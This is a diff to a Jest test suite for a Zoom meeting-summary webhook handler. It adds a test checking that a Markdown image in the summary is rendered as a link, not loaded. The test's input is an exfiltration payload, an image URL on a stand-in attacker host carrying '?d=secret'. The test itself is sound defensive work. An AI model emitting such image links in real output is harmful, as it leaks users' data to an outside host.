@@ -107,7 +107,7 @@ const transcriptCompleted = (downloadUrl: string) =>
     }
   })
 
-const summaryCompleted = (meetingEndTime: Date) =>
+const summaryCompleted = (meetingEndTime: Date, summaryContent?: string) =>
   JSON.stringify({
     event: 'meeting.summary_completed',
     payload: {
@@ -115,7 +115,8 @@ const summaryCompleted = (meetingEndTime: Date) =>
         meeting_host_id: 'zoom-host-id',
         meeting_uuid: 'zoom-meeting-uuid',
         meeting_end_time: meetingEndTime.toISOString(),
-        summary_overview: 'We agreed to ship on Friday.'
+        summary_overview: 'We agreed to ship on Friday.',
+        summary_content: summaryContent
       }
     }
   })
@@ -227,10 +228,10 @@ describe('zoomWebhookHandler', () => {
       executeTakeFirst: jest.fn()
     }
 
-    const reportCall = async (meetingEndTime: Date) => {
+    const reportCall = async (meetingEndTime: Date, summaryContent?: string) => {
       pg.execute.mockResolvedValueOnce(hostZoomAuths)
       mockedMatch.mockResolvedValueOnce(null)
-      const body = summaryCompleted(meetingEndTime)
+      const body = summaryCompleted(meetingEndTime, summaryContent)
       await send(signedHeaders(body), [body])
       await waitForDispatch()
     }
@@ -272,6 +273,23 @@ describe('zoomWebhookHandler', () => {
       await attachHeldZoomEvents('team-id')
       expect(mockedMatch).toHaveBeenCalledTimes(2)
       expect(attachTranscriptToSummaryPage).toHaveBeenCalledTimes(1)
+    })
+
+    it('links an outside image in the summary instead of loading it', async () => {
+      await reportCall(minutesAgo(1), '![x](https://evil.test/p.png?d=secret)')
+      pg.execute.mockResolvedValueOnce(teamZoomHosts).mockResolvedValueOnce(hostZoomAuths)
+      mockedMatch.mockResolvedValueOnce({
+        teamId: 'team-id',
+        name: 'Sprint Retro',
+        summaryPageId: 7,
+        userId: 'local|host'
+      })
+      pg.executeTakeFirst.mockResolvedValueOnce({numInsertedOrUpdatedRows: 1n})
+      await attachHeldZoomEvents('team-id')
+      const [, [page]] = jest.mocked(attachTranscriptToSummaryPage).mock.calls.at(-1)!
+      const content = page?.content
+      expect(JSON.stringify(content)).not.toContain('imageBlock')
+      expect(JSON.stringify(content)).toContain('https://evil.test/p.png')
     })
 
     it('lets the call go once no meeting could end near it', async () => {
